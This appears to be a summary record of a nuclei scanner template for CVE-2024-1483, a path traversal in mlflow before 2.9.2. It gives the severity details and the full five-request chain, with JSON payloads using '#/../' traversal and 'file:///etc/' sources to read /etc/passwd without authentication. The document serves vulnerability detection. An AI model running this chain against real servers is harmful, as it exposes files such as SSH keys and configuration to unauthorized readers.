---
cve_id: CVE-2024-1483
template_path: nuclei-templates/http/cves/2024/CVE-2024-1483.yaml
affected_product: mlflow
severity: high
authentication: none
external_callback: false
affected_versions: < 2.9.2
preconditions: []
poc_classification: info-leak
---

## Vulnerability

Path traversal (CWE-29) in mlflow < 2.9.2 allows unauthenticated remote attackers to read arbitrary server files. Flaw occurs in HTTP POST handlers for experiments and model versions due to missing validation of `artifact_location` and `source` parameters when supplied as local URIs containing `#` (instead of `?`). 

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (score 7.5).  
Impact: disclosure of sensitive files such as SSH keys or internal configurations.

## PoC / Detection
Classification: info-leak

The template executes a 5-request chain that creates objects and triggers the traversal to retrieve `/etc/passwd`:
1. POST `/ajax-api/2.0/mlflow/experiments/create` using `{"name":"{{randstr}}","artifact_location":"http:///#/../../../../../../../../../../../../../../etc/"}`
2. POST `/api/2.0/mlflow/runs/create` (extracts `EXPERIMENT_ID` internally)
3. POST `/ajax-api/2.0/mlflow/registered-models/create`
4. POST `/ajax-api/2.0/mlflow/model-versions/create` using `{"name":"{{randstr}}","run_id":"{{RUN_ID}}","source":"file:///etc/"}` (extracts `RUN_ID` internally)
5. GET `/model-versions/get-artifact?path=passwd&name={{randstr}}&version=1`

Matchers confirm success with regex `root:.*:0:0:` in final body, `filename=passwd` + `application/octet-stream` in headers, and HTTP 200.

## References
- https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d
- https://nvd.nist.gov/vuln/detail/CVE-2024-1483
